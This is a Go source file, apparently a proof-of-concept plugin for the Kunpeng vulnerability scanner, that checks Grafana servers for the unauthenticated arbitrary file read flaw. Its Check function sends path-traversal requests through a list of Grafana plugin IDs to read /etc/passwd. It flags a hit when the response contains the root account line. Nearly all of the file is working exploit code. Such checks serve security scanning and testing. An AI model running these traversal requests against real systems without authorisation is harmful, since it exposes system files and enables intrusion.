package mypocs

import (
	"net/http"
	"strings"

	plugin "github.com/deenrookie/kunpeng-plus/pocs"
	"github.com/opensec-cn/kunpeng/util"
)

type grafanaUnauthorized struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("grafana", &grafanaUnauthorized{})
}
func (d *grafanaUnauthorized) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "Grafana 未授权任意文件读取",
		Remarks: "Grafana 未授权任意文件读取",
		Level:   0,
		Type:    "LFI",
		Author:  "Deen",
		References: plugin.References{
			URL:  "https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/grafana/grafana-file-read.yaml",
			CVE:  "",
			KPID: "KP-1001",
		},
	}
	return d.info
}
func (d *grafanaUnauthorized) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}
func (d *grafanaUnauthorized) Check(URL string, meta plugin.TaskMeta) bool {
	pluginIds := []string{
		"grafana-clock-panel",
		"alertlist",
		"graph",
		"elasticsearch",
		"dashlist",
		"cloudwatch",
		"mysql",
		"influxdb",
		"heatmap",
		"graphite",
		"prometheus",
		"postgres",
		"pluginlist",
		"opentsdb",
		"text",
		"stackdriver",
	}
	for _, item := range pluginIds {
		request, err := http.NewRequest("GET", URL+"/public/plugins/"+item+"/../../../../../../../../../../../../../../../../../../../etc/passwd", nil)
		if err != nil {
			continue
		}
		request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		request.Header.Set("Referer", URL+"/session_login.cgi")
		resp, err := util.RequestDo(request, true)
		if err != nil {
			continue
		}
		if strings.Contains(resp.ResponseRaw, "root:x:0:0:root:") {
			result := d.info
			result.Response = resp.ResponseRaw
			result.Request = resp.RequestRaw
			d.result = append(d.result, result)
			return true
		}
	}
	return false
}
